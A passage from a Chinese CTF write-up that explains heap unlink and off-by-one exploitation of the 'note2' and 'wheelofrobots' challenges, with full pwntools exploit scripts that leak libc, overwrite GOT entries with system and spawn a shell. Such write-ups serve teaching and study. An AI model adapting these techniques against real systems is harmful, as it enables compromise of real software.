        system_addr = libc_base + libc.symbols['system']
        io.success("libc_base: 0x%x" % libc_base)
getshell,因为此时第一块堆块还指向atoi的got表，所以此时编辑下，就可以覆写got表了，输入的时候会将输入串atoi，所以就成为参数了
    #get_shell
        editnote(0, 1, p64(system_addr))
        io.sendline("/bin/sh")
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'note2'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'note2'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def newnote(size, content):
        io.sendline("1")
        io.sendline(str(size))
        io.sendline(content)
    def editnote(idx, choice, content):
        io.sendline("3")
        io.sendline(str(idx))
        io.sendline(str(choice))
        io.sendline(content)
    def delete(idx):
        io.sendline("4")
        io.sendline(str(idx))
    def shownote(idx):
        io.sendline("2")
        io.sendline(str(idx))
    def first():
        io.sendlineafter("Input your name:\n", "greenhand")
        io.sendlineafter("Input your address:\n", "greenhand")
    def exp():
        ptr = 0x0000000000602120 
        first()
        # unlink
        payload = p64(0) + p64(0xa0) + p64(ptr-0x18) + p64(ptr-0x10) 
        payload = payload.ljust(0x80, 'a')
        newnote(0x80, payload)
        newnote(0, 'b'*0x8)
        newnote(0x80, 'c'*0x20)
        delete(1)
        newnote(0, 'b'*0x10+p64(0xa0)+p64(0x90))
        delete(2)
        # leak
        payload = 'a'*0x18 + p64(elf.got['atoi'])
        editnote(0, 1, payload) 
        shownote(0)
        io.recvuntil("TheNewContents:Edit note success!\n")
        io.recvuntil("Content is ")
        atoi_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("atoi_addr: 0x%x" % atoi_addr)
        libc_base = atoi_addr - libc.symbols['atoi']
        system_addr = libc_base + libc.symbols['system']
        io.success("libc_base: 0x%x" % libc_base)
        #get_shell
        editnote(0, 1, p64(system_addr))
        io.sendline("/bin/sh")
        gdb.attach(io)
    if __name__ == '__main__':
        exp()
        io.interactive()
## 2017 insomni'hack wheelofrobots
这道题难点我觉得在于代码长了点，然后漏洞点难找了点，其余还好，我自己分析的时候又是一头雾水，只看出free的时候没置空，然后还有的是在change部分，他代销有的居然达到了0x9C40uLL，这里我觉得也是一个点，off-by-one真没看出来
[ctf-wiki讲解](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/)
我不在分析功能以及漏洞点分析，这次我自己没分析出来，只讲下漏洞利用过程以及过程中踩到的坑
### 漏洞利用过程
  1. 准备部分
    def add(idx, size=0):
        io.sendlineafter("Your choice :", "1")
        io.sendlineafter("Your choice :", str(idx))
        if idx == 2:
            io.sendlineafter("Increase Bender's intelligence: ", str(size))
        elif idx == 3:
            io.sendlineafter("Increase Robot Devil's cruelty: ", str(size))
        elif idx == 6:
            io.sendlineafter("Increase Destructor's powerful: ", str(size))
    def remove(idx):
        io.sendlineafter("Your choice :", "2")
        io.sendlineafter("Your choice :", str(idx))
    def change(idx, name):
        io.sendlineafter("Your choice :", "3")
        io.sendlineafter("Your choice :", str(idx))
        io.sendafter("Robot's name: ", name)
    def start_robot():
        io.sendlineafter("Your choice :", "4")
    def off_by_one(byte):
        io.sendlineafter("Your choice :", "1")
        io.sendlineafter("Your choice :", "9999" + byte)
    def write(addr1, addr2):
        change(1, p64(addr1))
        change(6, p64(addr2))
**注意：这里change是sendafter不是sendline，因为sendline会发送多一个\n破坏地址**
  1. off-by-one溢出修改部分
    add(2, 1)
        remove(2)
        off_by_one('\x01')
        # change fd pointer
        change(2, p64(0x0000000000603138))
        off_by_one('\x00')
        #pass the fastbin check size=0x20
        add(3, 0x20)
        #now idx2->0x603138->null
        #get malloc to -> 0x603138
        add(2, 1)
        #now 0x603138->null
        add(1)
        #whell 0x603138 , it's destructor_size
        #the size must bigger than remove(2) remove(3)'s  size
        add(6, 4)
        add(3, 7)
        #change idx6 size:1000
        change(1, p64(1000))
        ptr = 0x00000000006030E8
        payload = p64(0) + p64(0x50) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x50, 'a')
        payload += p64(0x50) #pre_size
        payload += p64(0xa0) #size
        change(6, payload)
        # unlink
        remove(3)
这里的话，要注意的就是开头申请的两个add了，那个不能低于remove的大小，不然会重新覆盖到那上边去，至于大小是多少，自己构造就好，然后溢出覆盖unlink，常见了
  1. 修改并泄露地址
    payload = p64(0)*2 + 'a'*0x18 + p64(ptr)
        change(6, payload)
        #gdb.attach(io)
        write(elf.got['exit'], 0x0000000000401855)
        # change robot_wheel to 3
        write(0x603130, 3)
        change(1, p64(elf.got['puts']))
        start_robot()
        # leak 
        io.recvuntil(" Thx ")
        puts_addr = u64(io.recv(6).strip().ljust(8, '\x00'))
        io.success("puts_addr: 0x%x" % puts_addr)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
我觉得这部分跟unlink属于同一部分的，重新修改地址，这里是将tinny改成指向destructor的位置处，这样编辑1就可以编辑第6处指针，在编辑第六处就是写入了，相当于任意写  
写入完后泄露
  1. getshell了
    #get shell
        write(elf.got['atoi'], system_addr)
        io.send("sh;#")
跟前面套路一样，改掉atoi，然后传入sh就完了，ctf-wiki的改的free
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'wheelofrobots'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '127.0.0.1'
    port = 10000
    #don't forget to change it
    #ctx.binary = './' + 'wheelofrobots'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def add(idx, size=0):
        io.sendlineafter("Your choice :", "1")
        io.sendlineafter("Your choice :", str(idx))
        if idx == 2:
            io.sendlineafter("Increase Bender's intelligence: ", str(size))
        elif idx == 3:
            io.sendlineafter("Increase Robot Devil's cruelty: ", str(size))
        elif idx == 6:
            io.sendlineafter("Increase Destructor's powerful: ", str(size))
    def remove(idx):
        io.sendlineafter("Your choice :", "2")
        io.sendlineafter("Your choice :", str(idx))
    def change(idx, name):
        io.sendlineafter("Your choice :", "3")
        io.sendlineafter("Your choice :", str(idx))
        io.sendafter("Robot's name: ", name)
    def start_robot():
        io.sendlineafter("Your choice :", "4")
    def off_by_one(byte):
        io.sendlineafter("Your choice :", "1")
        io.sendlineafter("Your choice :", "9999" + byte)
    def write(addr1, addr2):